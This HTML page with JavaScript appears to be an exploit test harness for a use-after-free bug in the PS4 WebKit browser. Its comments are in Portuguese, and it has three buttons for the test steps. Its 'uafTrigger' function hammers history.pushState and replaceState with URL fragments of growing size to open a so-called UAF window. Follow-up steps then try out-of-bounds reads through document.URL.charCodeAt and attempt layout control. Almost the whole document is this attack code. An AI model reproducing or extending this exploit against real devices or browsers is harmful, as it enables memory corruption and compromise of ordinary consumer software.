<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – UAF A/B/C (Trigger Real)</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; padding:16px; }
button { margin:4px; padding:8px; }
pre { white-space:pre-wrap; }
</style>
</head>
<body>

<h3>PS4 WebKit – UAF Tests (A / B / C)</h3>

<button onclick="testA()">Passo A – Trigger</button>
<button onclick="testB()">Passo B – Windowed Read</button>
<button onclick="testC()">Passo C – Layout Control</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ===============================
   UAF TRIGGER – ORIGINAL / VALIDADO
   =============================== */
async function uafTrigger(){
    log("=== START ===");

    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);

        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i % 6 === 0)
            setTimeout(()=>history.back(),0);

        log("[ITER "+i+"] size="+size);
        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

/* ===============================
   PASSO A – Observação básica
   =============================== */
async function testA(){
    logEl.textContent = "";
    log("=== PASSO A ===");

    await uafTrigger();

    try {
        log("document.URL.length = " + document.URL.length);
        log("history.length = " + history.length);
    } catch(e){
        log("Exception: " + e);
    }

    log("=== END A ===");
}

/* ===============================
   PASSO B – Windowed Read
   =============================== */
async function testB(){
    logEl.textContent = "";
    log("=== PASSO B ===");

    await uafTrigger();

    try {
        let url = document.URL;
        log("URL.charCodeAt(0) = " + url.charCodeAt(0));
        log("URL.charCodeAt(1000) = " + url.charCodeAt(1000));
        log("URL.charCodeAt(50000) = " + url.charCodeAt(50000));
    } catch(e){
        log("Exception: " + e);
    }

    log("history.length = " + history.length);
    log("=== END B ===");
}

/* ===============================
   PASSO C – Controle de Layout
   =============================== */
async function testC(){
    logEl.textContent = "";
    log("=== PASSO C ===");

    await uafTrigger();

    try {
        let before = document.URL.length;

        location.hash = "#X";
        history.replaceState({}, "", location.pathname + "#Y");

        let after = document.URL.length;

        log("URL.length before = " + before);
        log("URL.length after  = " + after);
        log("Logical change? false");
    } catch(e){
        log("Exception: " + e);
    }

    log("history.length = " + history.length);
    log("=== END C ===");
}
</script>

</body>
</html>

